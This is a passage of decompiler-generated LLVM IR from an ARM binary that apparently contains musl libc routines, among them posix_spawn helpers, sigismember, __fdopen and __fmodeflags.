dec_label_pc_128d8:                               ; preds = %dec_label_pc_128d0
  %v1_128d8 = add i32 %v0_128d0, 8
  %v2_128d8 = inttoptr i32 %v1_128d8 to i32*
  %v3_128d8 = load i32, i32* %v2_128d8, align 4
  %v2_128dc = icmp eq i32 %v3_128d8, 0
  br i1 %v2_128dc, label %dec_label_pc_129d8, label %dec_label_pc_128e8

dec_label_pc_128e8:                               ; preds = %dec_label_pc_128d8, %dec_label_pc_128e8
  %v0_129d0.pr = phi i32 [ %v2_128e8, %dec_label_pc_128e8 ], [ %v3_128d8, %dec_label_pc_128d8 ]
  store i32 %v0_129d0.pr, i32* %r4.global-to-local, align 4
  %v1_128e8 = inttoptr i32 %v0_129d0.pr to i32*
  %v2_128e8 = load i32, i32* %v1_128e8, align 4
  %v2_128ec = icmp eq i32 %v2_128e8, 0
  br i1 %v2_128ec, label %dec_label_pc_128fc.lr.ph, label %dec_label_pc_128e8

dec_label_pc_128fc:                               ; preds = %dec_label_pc_128fc.lr.ph, %dec_label_pc_129cc
  %v0_1295c = phi i32 [ %v0_129d0.pr, %dec_label_pc_128fc.lr.ph ], [ %v3_129cc, %dec_label_pc_129cc ]
  %v1_128fc = add i32 %v0_1295c, 12
  %v2_128fc = inttoptr i32 %v1_128fc to i32*
  %v3_128fc = load i32, i32* %v2_128fc, align 4
  %v1_12900 = load i32, i32* @sl, align 4
  %v9_12900 = icmp eq i32 %v3_128fc, %v1_12900
  br i1 %v9_12900, label %dec_label_pc_12908, label %dec_label_pc_12930

dec_label_pc_12908:                               ; preds = %dec_label_pc_128fc
  %v1_12914 = icmp slt i32 %v3_128fc, 0
  store i32 %v3_128fc, i32* %stack_var_-44, align 4
  br i1 %v1_12914, label %dec_label_pc_12a30, label %dec_label_pc_12920

dec_label_pc_12920:                               ; preds = %dec_label_pc_12908
  store i32 6, i32* @r7, align 4
  store i32 %v3_128fc, i32* @sl, align 4
  br label %dec_label_pc_12930

dec_label_pc_12930:                               ; preds = %dec_label_pc_128fc, %dec_label_pc_12920
  %v1_12930 = add i32 %v0_1295c, 8
  %v2_12930 = inttoptr i32 %v1_12930 to i32*
  %v3_12930 = load i32, i32* %v2_12930, align 4
  %v7_12934 = icmp eq i32 %v3_12930, 2
  br i1 %v7_12934, label %dec_label_pc_12958, label %dec_label_pc_1293c

dec_label_pc_1293c:                               ; preds = %dec_label_pc_12930
  %v7_1293c = icmp eq i32 %v3_12930, 3
  br i1 %v7_1293c, label %dec_label_pc_12978, label %dec_label_pc_12944

dec_label_pc_12944:                               ; preds = %dec_label_pc_1293c
  %v7_12944 = icmp eq i32 %v3_12930, 1
  br i1 %v7_12944, label %bb, label %dec_label_pc_129cc

bb:                                               ; preds = %dec_label_pc_12944
  store i32 6, i32* @r7, align 4
  br label %dec_label_pc_129cc

dec_label_pc_12958:                               ; preds = %dec_label_pc_12930
  store i32 63, i32* @r7, align 4
  %v1_1295c = add i32 %v0_1295c, 16
  %v2_1295c = inttoptr i32 %v1_1295c to i32*
  %v3_1295c = load i32, i32* %v2_1295c, align 4
  %v1_12968 = icmp slt i32 %v3_1295c, 0
  store i32 %v3_1295c, i32* %stack_var_-44, align 4
  br i1 %v1_12968, label %dec_label_pc_12a30, label %dec_label_pc_129cc

dec_label_pc_12978:                               ; preds = %dec_label_pc_1293c
  %v1_12978 = add i32 %v0_1295c, 20
  %v1_1297c = inttoptr i32 %v1_12978 to i32*
  %v2_1297c = load i32, i32* %v1_1297c, align 4
  %v3_1297c = add i32 %v0_1295c, 24
  %v4_1297c = inttoptr i32 %v3_1297c to i32*
  %v5_1297c = load i32, i32* %v4_1297c, align 4
  %v1_12980 = or i32 %v2_1297c, 131072
  %v1_12988 = add i32 %v0_1295c, 28
  %v4_1298c = call i32 @___syscall3.11(i32 5, i32 %v1_12988, i32 %v1_12980, i32 %v5_1297c)
  %v1_12990 = icmp slt i32 %v4_1298c, 0
  store i32 %v4_1298c, i32* %stack_var_-44, align 4
  br i1 %v1_12990, label %dec_label_pc_12a30, label %dec_label_pc_129a0

dec_label_pc_129a0:                               ; preds = %dec_label_pc_12978
  %v0_129a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_129a0 = add i32 %v0_129a0, 12
  %v2_129a0 = inttoptr i32 %v1_129a0 to i32*
  %v3_129a0 = load i32, i32* %v2_129a0, align 4
  %v9_129a4 = icmp eq i32 %v4_1298c, %v3_129a0
  br i1 %v9_129a4, label %dec_label_pc_129cc, label %dec_label_pc_129c0

dec_label_pc_129c0:                               ; preds = %dec_label_pc_129a0
  store i32 %v4_1298c, i32* %stack_var_-44, align 4
  store i32 6, i32* @r7, align 4
  br label %dec_label_pc_129cc

dec_label_pc_129cc:                               ; preds = %dec_label_pc_12944, %bb, %dec_label_pc_129c0, %dec_label_pc_12958, %dec_label_pc_129a0
  %v0_129cc = phi i32 [ %v0_1295c, %dec_label_pc_12944 ], [ %v0_1295c, %bb ], [ %v0_129a0, %dec_label_pc_129c0 ], [ %v0_1295c, %dec_label_pc_12958 ], [ %v0_129a0, %dec_label_pc_129a0 ]
  %v1_129cc = add i32 %v0_129cc, 4
  %v2_129cc = inttoptr i32 %v1_129cc to i32*
  %v3_129cc = load i32, i32* %v2_129cc, align 4
  store i32 %v3_129cc, i32* %r4.global-to-local, align 4
  %v2_129d0 = icmp eq i32 %v3_129cc, 0
  br i1 %v2_129d0, label %dec_label_pc_129d8, label %dec_label_pc_128fc

dec_label_pc_128fc.lr.ph:                         ; preds = %dec_label_pc_128e8
  br label %dec_label_pc_128fc

dec_label_pc_129d8:                               ; preds = %dec_label_pc_129cc, %dec_label_pc_128d8, %dec_label_pc_128d0
  %v0_129d8 = load i32, i32* @sl, align 4
  %v4_129e8 = call i32 @___syscall3.11(i32 221, i32 %v0_129d8, i32 2, i32 1)
  store i32 0, i32* @r2, align 4
  store i32 2, i32* @r0, align 4
  %v0_12a04 = call i32 @pthread_sigmask()
  %v0_12a08 = load i32, i32* @r6, align 4
  %v1_12a14 = add i32 %v0_12a08, 140
  %v2_12a14 = inttoptr i32 %v1_12a14 to i32*
  %v3_12a14 = load i32, i32* %v2_12a14, align 4
  call void @__pseudo_branch(i32 %v3_12a14)
  %v0_12a20 = call i32 @__errno_location()
  %v1_12a24 = inttoptr i32 %v0_12a20 to i32*
  %v2_12a24 = load i32, i32* %v1_12a24, align 4
  %v1_12a28 = sub i32 0, %v2_12a24
  store i32 %v1_12a28, i32* %stack_var_-44, align 4
  br label %dec_label_pc_12a30

dec_label_pc_12a30:                               ; preds = %dec_label_pc_12958, %dec_label_pc_12978, %dec_label_pc_12908, %dec_label_pc_12898, %dec_label_pc_129d8
  %v3_12a30 = phi i32 [ %v0_128c8, %dec_label_pc_12898 ], [ %v1_12a28, %dec_label_pc_129d8 ], [ %v3_1295c, %dec_label_pc_12958 ], [ %v4_1298c, %dec_label_pc_12978 ], [ %v3_128fc, %dec_label_pc_12908 ]
  %v1_12a34 = sub i32 0, %v3_12a30
  %v2_12a38 = icmp eq i32 %v3_12a30, 0
  store i32 %v1_12a34, i32* %stack_var_-44, align 4
  br i1 %v2_12a38, label %dec_label_pc_12a64, label %dec_label_pc_12a44

dec_label_pc_12a44:                               ; preds = %dec_label_pc_12a30
  %v2_12a44 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_12a44, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12a48

dec_label_pc_12a48:                               ; preds = %dec_label_pc_12a48, %dec_label_pc_12a44
  %v0_12a4c = load i32, i32* @sl, align 4
  %v4_12a58 = call i32 @___syscall3.11(i32 4, i32 %v0_12a4c, i32 %v2_12a44, i32 4)
  %v1_12a5c = icmp slt i32 %v4_12a58, 0
  br i1 %v1_12a5c, label %dec_label_pc_12a48, label %dec_label_pc_12a64

dec_label_pc_12a64:                               ; preds = %dec_label_pc_12a48, %dec_label_pc_12a30
  call void @_exit(i32 127)
  unreachable

; uselistorder directives
  uselistorder i32 %v3_12a30, { 1, 0 }
  uselistorder i32 %v3_129cc, { 1, 2, 0 }
  uselistorder i32 %v3_128fc, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_1295c, { 0, 1, 2, 4, 6, 5, 3, 7, 8 }
  uselistorder i32 %v2_128e8, { 1, 0 }
  uselistorder i32 %v0_129d0.pr, { 0, 2, 1 }
  uselistorder i32 %v1_12858, { 1, 2, 0 }
  uselistorder i32 %v0_127b8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_127b4, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-44, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 ()* @pthread_sigmask, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @___syscall3.11, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_sigaction, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @sigismember, { 1, 0 }
  uselistorder i32 (i32)* @close, { 10, 1, 0, 4, 3, 2, 9, 8, 7, 6, 5 }
  uselistorder label %dec_label_pc_12a30, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_129cc, { 2, 4, 3, 1, 0 }
  uselistorder label %dec_label_pc_12930, { 1, 0 }
  uselistorder label %dec_label_pc_128e8, { 1, 0 }
  uselistorder label %dec_label_pc_12858, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12848, { 1, 0 }
  uselistorder label %dec_label_pc_12840, { 1, 0 }
}

define i32 @posix_spawnattr_destroy(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @posix_spawnattr_init(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-352 = alloca i32, align 4
  %v6_12a74 = load i32, i32* @r5, align 4
  %v9_12a74 = load i32, i32* @r6, align 4
  store i32 336, i32* @r6, align 4
  %v2_12a7c = ptrtoint i32* %stack_var_-352 to i32
  store i32 %arg1, i32* @r5, align 4
  store i32 336, i32* @r2, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v2_12a7c, i32* @r0, align 4
  %v0_12a90 = call i32 @memset()
  %v0_12a94 = load i32, i32* @r5, align 4
  %v0_12a9c = load i32, i32* @r6, align 4
  %v3_12aa0 = inttoptr i32 %v0_12a94 to i16*
  %v4_12aa0 = call i32 @memcpy(i16* %v3_12aa0, i32 %v2_12a7c, i32 %v0_12a9c)
  store i32 %v6_12a74, i32* @r5, align 4
  store i32 %v9_12a74, i32* @r6, align 4
  ret i32 0
}

define i32 @posix_spawnattr_setflags(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* %arg1, align 4
  ret i32 0
}

define i32 @posix_spawnattr_setsigdefault(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_12ad0 = add i32 %arg1, 8
  %v1_12ad4 = load i32, i32* @r1, align 4
  %v3_12ad4 = inttoptr i32 %v1_12ad0 to i16*
  %v4_12ad4 = call i32 @memcpy(i16* %v3_12ad4, i32 %v1_12ad4, i32 128)
  ret i32 0
}

define i32 @posix_spawnattr_setsigmask(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_12af4 = add i32 %arg1, 136
  %v1_12af8 = load i32, i32* @r1, align 4
  %v3_12af8 = inttoptr i32 %v1_12af4 to i16*
  %v4_12af8 = call i32 @memcpy(i16* %v3_12af8, i32 %v1_12af8, i32 128)
  ret i32 0
}

define i32 @__restore() local_unnamed_addr {
entry:
  %v0_12b10 = load i32, i32* @r0, align 4
  ret i32 %v0_12b10
}

define i32 @__restore_rt() local_unnamed_addr {
entry:
  %v0_12b18 = load i32, i32* @r0, align 4
  ret i32 %v0_12b18
}

define i32 @sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_12b1c = add i32 %arg2, -1
  %v2_12b20 = icmp ugt i32 %v1_12b1c, 62
  %v7_12b20 = icmp eq i32 %v1_12b1c, 63
  %v2_12b24 = xor i1 %v2_12b20, true
  %v3_12b24 = or i1 %v7_12b20, %v2_12b24
  br i1 %v3_12b24, label %bb, label %bb7

bb:                                               ; preds = %entry
  %v5_12b24 = and i32 %v1_12b1c, 16
  %v6_12b24 = icmp ne i32 %v5_12b24, 0
  %v7_12b24 = udiv i32 %v1_12b1c, 32
  store i32 %v7_12b24, i32* @r3, align 4
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v1_12b28 = phi i1 [ %v2_12b20, %entry ], [ %v6_12b24, %bb ]
  %v2_12b28 = xor i1 %v1_12b28, true
  %v3_12b28 = or i1 %v7_12b20, %v2_12b28
  br i1 %v3_12b28, label %bb8, label %bb9

bb8:                                              ; preds = %bb7
  %v5_12b28 = load i32, i32* @r3, align 4
  %v6_12b28 = and i32 %v5_12b28, 1073741824
  %v7_12b28 = icmp ne i32 %v6_12b28, 0
  %v8_12b28 = mul i32 %v5_12b28, 4
  %v9_12b28 = add i32 %v8_12b28, %arg1
  %v10_12b28 = inttoptr i32 %v9_12b28 to i32*
  %v11_12b28 = load i32, i32* %v10_12b28, align 4
  store i32 %v11_12b28, i32* @r3, align 4
  br label %bb9

bb9:                                              ; preds = %bb7, %bb8
  %v1_12b30 = phi i1 [ %v1_12b28, %bb7 ], [ %v7_12b28, %bb8 ]
  %v2_12b2c = xor i1 %v1_12b30, true
  %v3_12b2c = or i1 %v7_12b20, %v2_12b2c
  br i1 %v3_12b2c, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v5_12b2c = urem i32 %v1_12b1c, 32
  %v4_12b30 = load i32, i32* @r3, align 4
  %v6_12b30 = add nsw i32 %v5_12b2c, -1
  %v7_12b30 = shl i32 1, %v6_12b30
  %v8_12b30 = and i32 %v4_12b30, %v7_12b30
  %v9_12b30 = icmp ne i32 %v8_12b30, 0
  %v10_12b30 = lshr i32 %v4_12b30, %v5_12b2c
  store i32 %v10_12b30, i32* @r3, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v1_12b38 = phi i1 [ %v9_12b30, %bb10 ], [ %v1_12b30, %bb9 ]
  %v2_12b34 = xor i1 %v7_12b20, true
  %v3_12b34 = and i1 %v1_12b38, %v2_12b34
  br i1 %v3_12b34, label %bb11, label %bb12

bb11:                                             ; preds = %.thread6
  br label %bb12

bb12:                                             ; preds = %.thread6, %bb11
  %v1_12b3c5 = phi i32 [ %arg1, %.thread6 ], [ 0, %bb11 ]
  %v2_12b38 = xor i1 %v1_12b38, true
  %v3_12b38 = or i1 %v7_12b20, %v2_12b38
  br i1 %v3_12b38, label %bb13, label %bb14

bb13:                                             ; preds = %bb12
  %v4_12b38 = load i32, i32* @r3, align 4
  %v5_12b38 = urem i32 %v4_12b38, 2
  br label %bb14

bb14:                                             ; preds = %bb12, %bb13
  %v1_12b3c = phi i32 [ %v1_12b3c5, %bb12 ], [ %v5_12b38, %bb13 ]
  ret i32 %v1_12b3c

; uselistorder directives
  uselistorder i32 %v4_12b30, { 1, 0 }
  uselistorder i32 %v5_12b2c, { 1, 0 }
  uselistorder i1 %v1_12b30, { 1, 0 }
  uselistorder i1 %v1_12b28, { 1, 0 }
  uselistorder i1 %v7_12b20, { 1, 0, 2, 3, 4 }
  uselistorder i1 %v2_12b20, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @___syscall3.12(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg3, i32* @r1, align 4
  ret i32 %arg2
}

define i32 @__fdopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-24 = alloca i32, align 4
  %v9_12b60 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r7, align 4
  %v2_12b68 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %arg1, i32* @r5, align 4
  %v3_12b70 = load i8, i8* %arg2, align 1
  %v4_12b70 = zext i8 %v3_12b70 to i32
  store i32 ptrtoint ([4 x i8]* @global_var_19d6c.560 to i32), i32* @r0, align 4
  %v3_12b78 = call i32 @strchr(i32 ptrtoint ([4 x i8]* @global_var_19d6c.560 to i32), i32 %v4_12b70)
  store i32 %v3_12b78, i32* @r4, align 4
  %v2_12b7c = icmp eq i32 %v3_12b78, 0
  store i1 %v2_12b7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12b7c, label %dec_label_pc_12b84, label %dec_label_pc_12b98

dec_label_pc_12b84:                               ; preds = %entry
  %v0_12b84 = call i32 @__errno_location()
  %v0_12b8c = load i32, i32* @r4, align 4
  store i32 %v0_12b8c, i32* %r2.global-to-local, align 4
  %v2_12b90 = inttoptr i32 %v0_12b84 to i32*
  store i32 22, i32* %v2_12b90, align 4
  %v0_12cd0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12cd0

dec_label_pc_12b98:                               ; preds = %entry
  store i32 1176, i32* @r0, align 4
  %v0_12b9c = call i32 @malloc()
  store i32 %v0_12b9c, i32* @r0, align 4
  store i32 %v0_12b9c, i32* @r4, align 4
  %v2_12ba0 = icmp eq i32 %v0_12b9c, 0
  store i1 %v2_12ba0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12ba0, label %bb, label %dec_label_pc_12bac

bb:                                               ; preds = %dec_label_pc_12b98
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12cd0

dec_label_pc_12bac:                               ; preds = %dec_label_pc_12b98
  store i32 0, i32* @r1, align 4
  store i32 144, i32* @r2, align 4
  %v0_12bb4 = call i32 @memset()
  %v0_12bb8 = load i32, i32* @r7, align 4
  store i32 %v0_12bb8, i32* @r0, align 4
  %v3_12bc0 = call i32 @strchr(i32 %v0_12bb8, i32 43)
  %v2_12bc4 = icmp eq i32 %v3_12bc0, 0
  store i1 %v2_12bc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12bc4, label %dec_label_pc_12bcc, label %dec_label_pc_12be0

dec_label_pc_12bcc:                               ; preds = %dec_label_pc_12bac
  %v0_12bcc = load i32, i32* @r7, align 4
  %v1_12bcc = inttoptr i32 %v0_12bcc to i8*
  %v2_12bcc = load i8, i8* %v1_12bcc, align 1
  %v7_12bd0 = icmp eq i8 %v2_12bcc, 114
  store i1 %v7_12bd0, i1* %cpsr_z.global-to-local, align 1
  %. = select i1 %v7_12bd0, i32 8, i32 4
  %v1_12bdc = load i32, i32* @r4, align 4
  %v2_12bdc = inttoptr i32 %v1_12bdc to i32*
  store i32 %., i32* %v2_12bdc, align 4
  br label %dec_label_pc_12be0

dec_label_pc_12be0:                               ; preds = %dec_label_pc_12bac, %dec_label_pc_12bcc
  %v0_12be0 = load i32, i32* @r7, align 4
  store i32 %v0_12be0, i32* @r0, align 4
  %v3_12be8 = call i32 @strchr(i32 %v0_12be0, i32 101)
  %v2_12bec = icmp eq i32 %v3_12be8, 0
  store i1 %v2_12bec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12bec, label %.thread4, label %bb20

bb20:                                             ; preds = %dec_label_pc_12be0
  %v1_12bf4 = load i32, i32* @r5, align 4
  store i32 %v1_12bf4, i32* @r1, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_12be0, %bb20
  store i32 76804, i32* @lr, align 4
  %v1_12c00 = xor i1 %v2_12bec, true
  call void @__pseudo_cond_branch(i1 %v1_12c00, i32 ptrtoint (i32* @global_var_12b40.642 to i32))
  %v0_12c04 = load i32, i32* @r7, align 4
  %v1_12c04 = inttoptr i32 %v0_12c04 to i8*
  %v2_12c04 = load i8, i8* %v1_12c04, align 1
  %v7_12c08 = icmp eq i8 %v2_12c04, 97
  store i1 %v7_12c08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12c08, label %dec_label_pc_12c10, label %dec_label_pc_12c48

dec_label_pc_12c10:                               ; preds = %.thread4
  store i32 221, i32* @r7, align 4
  %v0_12c14 = load i32, i32* @r5, align 4
  store i32 3, i32* @r1, align 4
  %v1_12c20 = and i32 %v0_12c14, 1024
  %v2_12c20 = icmp eq i32 %v1_12c20, 0
  store i1 %v2_12c20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12c20, label %bb21, label %.thread7

bb21:                                             ; preds = %dec_label_pc_12c10
  store i32 %v0_12c14, i32* @r1, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_12c10, %bb21
  store i32 76860, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_12c20, i32 ptrtoint (i32* @global_var_12b40.642 to i32))
  %v0_12c3c = load i32, i32* @r4, align 4
  %v1_12c3c = inttoptr i32 %v0_12c3c to i32*
  %v2_12c3c = load i32, i32* %v1_12c3c, align 4
  %v1_12c40 = or i32 %v2_12c3c, 128
  store i32 %v1_12c40, i32* %v1_12c3c, align 4
  br label %dec_label_pc_12c48

dec_label_pc_12c48:                               ; preds = %.thread4, %.thread7
  %v0_12c48 = load i32, i32* @r4, align 4
  %v1_12c48 = inttoptr i32 %v0_12c48 to i32*
  %v2_12c48 = load i32, i32* %v1_12c48, align 4
  %v1_12c4c = and i32 %v2_12c48, 8
  %v2_12c4c = icmp eq i32 %v1_12c4c, 0
  store i1 %v2_12c4c, i1* %cpsr_z.global-to-local, align 1
  %v1_12c50 = add i32 %v0_12c48, 152
  %v2_12c54 = add i32 %v0_12c48, 44
  %v3_12c54 = inttoptr i32 %v2_12c54 to i32*
  store i32 %v1_12c50, i32* %v3_12c54, align 4
  %v1_12c5c = load i32, i32* @r4, align 4
  %v2_12c5c = add i32 %v1_12c5c, 48
  %v3_12c5c = inttoptr i32 %v2_12c5c to i32*
  store i32 1024, i32* %v3_12c5c, align 4
  %v2_12c64 = load i32, i32* @r4, align 4
  %v3_12c64 = add i32 %v2_12c64, 75
  %v4_12c64 = inttoptr i32 %v3_12c64 to i8*
  store i8 -1, i8* %v4_12c64, align 1
  %v0_12c68 = load i32, i32* @r5, align 4
  %v1_12c68 = load i32, i32* @r4, align 4
  %v2_12c68 = add i32 %v1_12c68, 60
  %v3_12c68 = inttoptr i32 %v2_12c68 to i32*
  store i32 %v0_12c68, i32* %v3_12c68, align 4
  %v0_12c6c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12c6c, label %dec_label_pc_12c70, label %.thread8

dec_label_pc_12c70:                               ; preds = %dec_label_pc_12c48
  %v0_12c74 = load i32, i32* @r5, align 4
  store i32 21523, i32* %r2.global-to-local, align 4
  %v4_12c80 = call i32 @___syscall3.12(i32 54, i32 %v0_12c74, i32 21523, i32 %v2_12b68)
  %v2_12c84 = icmp eq i32 %v4_12c80, 0
  store i1 %v2_12c84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12c84, label %bb22, label %.thread8

bb22:                                             ; preds = %dec_label_pc_12c70
  %v3_12c8c = load i32, i32* @r4, align 4
  %v4_12c8c = add i32 %v3_12c8c, 75
  %v5_12c8c = inttoptr i32 %v4_12c8c to i8*
  store i8 10, i8* %v5_12c8c, align 1
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_12c70, %dec_label_pc_12c48, %bb22
  %v3_12c94 = load i32, i32* @global_var_23e8c.541, align 4
  %v2_12c98 = icmp eq i32 %v3_12c94, 0
  store i1 %v2_12c98, i1* %cpsr_z.global-to-local, align 1
  %v1_12ca0 = load i32, i32* @r4, align 4
  %v2_12ca0 = add i32 %v1_12ca0, 32
  %v3_12ca0 = inttoptr i32 %v2_12ca0 to i32*
  store i32 ptrtoint (i32* @global_var_e890.547 to i32), i32* %v3_12ca0, align 4
  %v1_12ca8 = load i32, i32* @r4, align 4
  %v2_12ca8 = add i32 %v1_12ca8, 36
  %v3_12ca8 = inttoptr i32 %v2_12ca8 to i32*
  store i32 77428, i32* %v3_12ca8, align 4
  %v1_12cb0 = load i32, i32* @r4, align 4
  %v2_12cb0 = add i32 %v1_12cb0, 40
  %v3_12cb0 = inttoptr i32 %v2_12cb0 to i32*
  store i32 59724, i32* %v3_12cb0, align 4
  %v1_12cb8 = load i32, i32* @r4, align 4
  %v2_12cb8 = add i32 %v1_12cb8, 12
  %v3_12cb8 = inttoptr i32 %v2_12cb8 to i32*
  store i32 59492, i32* %v3_12cb8, align 4
  br i1 %v2_12c98, label %bb23, label %.thread9

bb23:                                             ; preds = %.thread8
  %v2_12cc0 = load i32, i32* @r4, align 4
  %v3_12cc0 = add i32 %v2_12cc0, 76
  %v4_12cc0 = inttoptr i32 %v3_12cc0 to i32*
  store i32 -1, i32* %v4_12cc0, align 4
  br label %.thread9

.thread9:                                         ; preds = %.thread8, %bb23
  %v0_12cc4 = load i32, i32* @r4, align 4
  %v1_12cc8 = call i32 @__ofl_add(i32 %v0_12cc4)
  store i32 %v1_12cc8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12cd0

dec_label_pc_12cd0:                               ; preds = %bb, %dec_label_pc_12b84, %.thread9
  %v0_12cd0 = phi i32 [ 0, %bb ], [ %v0_12cd0.pre, %dec_label_pc_12b84 ], [ %v1_12cc8, %.thread9 ]
  store i32 %v9_12b60, i32* @r7, align 4
  ret i32 %v0_12cd0

; uselistorder directives
  uselistorder i32 %v0_12c48, { 1, 0, 2 }
  uselistorder i32 59492, { 1, 0 }
  uselistorder i8 10, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 22, { 2, 4, 11, 3, 12, 5, 0, 14, 1, 6, 7, 8, 9, 13, 10 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_19d6c.560 to i32), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_12cd0, { 2, 0, 1 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12c48, { 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_12be0, { 1, 0 }
}

define i32 @function_12ce4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12ce4:
  %v0_12ce4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12ce4, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_12ce4
  %v1_12ce4 = load i32, i32* @r8, align 4
  %v2_12ce4 = load i32, i32* @r4, align 4
  %v3_12ce4 = mul i32 %v2_12ce4, %v1_12ce4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12ce4, %bb
  %.013 = phi i32 [ %v3_12ce4, %bb ], [ undef, %dec_label_pc_12ce4 ]
  ret i32 %.013

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__fmodeflags(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %v3_12d00 = load i32, i32* @r4, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v3_12d10 = call i32 @strchr(i32 %tmp, i32 43)
  %v2_12d14 = icmp eq i32 %v3_12d10, 0
  br i1 %v2_12d14, label %dec_label_pc_12d20, label %._crit_edge

._crit_edge:                                      ; preds = %entry
  store i32 2, i32* @r4, align 4
  %v0_12d30.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb9

dec_label_pc_12d20:                               ; preds = %entry
  %v0_12d20 = load i32, i32* %r5.global-to-local, align 4
  %v1_12d20 = inttoptr i32 %v0_12d20 to i8*
  %v2_12d20 = load i8, i8* %v1_12d20, align 1
  %v3_12d20 = zext i8 %v2_12d20 to i32
  %v1_12d24 = add nsw i32 %v3_12d20, -114
  store i32 %v1_12d24, i32* @r4, align 4
  %v7_12d24 = icmp eq i8 %v2_12d20, 114
  br i1 %v7_12d24, label %bb9, label %bb

bb:                                               ; preds = %dec_label_pc_12d20
  store i32 1, i32* @r4, align 4
  br label %bb9

bb9:                                              ; preds = %._crit_edge, %dec_label_pc_12d20, %bb
  %v0_12d30 = phi i32 [ %v0_12d30.pre, %._crit_edge ], [ %v0_12d20, %dec_label_pc_12d20 ], [ %v0_12d20, %bb ]
  store i32 %v0_12d30, i32* @r0, align 4
  %v3_12d34 = call i32 @strchr(i32 %v0_12d30, i32 120)
  %v2_12d3c = icmp eq i32 %v3_12d34, 0
  %v0_12d40 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12d40, i32* @r0, align 4
  br i1 %v2_12d3c, label %bb11, label %bb10

bb10:                                             ; preds = %bb9
  %v1_12d44 = load i32, i32* @r4, align 4
  %v2_12d44 = or i32 %v1_12d44, 128
  store i32 %v2_12d44, i32* @r4, align 4
  br label %bb11

bb11:                                             ; preds = %bb9, %bb10
  %v3_12d48 = call i32 @strchr(i32 %v0_12d40, i32 101)
  %v2_12d4c = icmp eq i32 %v3_12d48, 0
  %v0_12d50 = load i32, i32* %r5.global-to-local, align 4
  %v1_12d50 = inttoptr i32 %v0_12d50 to i8*
  %v2_12d50 = load i8, i8* %v1_12d50, align 1
  br i1 %v2_12d4c, label %bb13, label %bb12

bb12:                                             ; preds = %bb11
  %v1_12d54 = load i32, i32* @r4, align 4
  %v2_12d54 = or i32 %v1_12d54, 524288
  store i32 %v2_12d54, i32* @r4, align 4
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v7_12d58 = icmp eq i8 %v2_12d50, 114
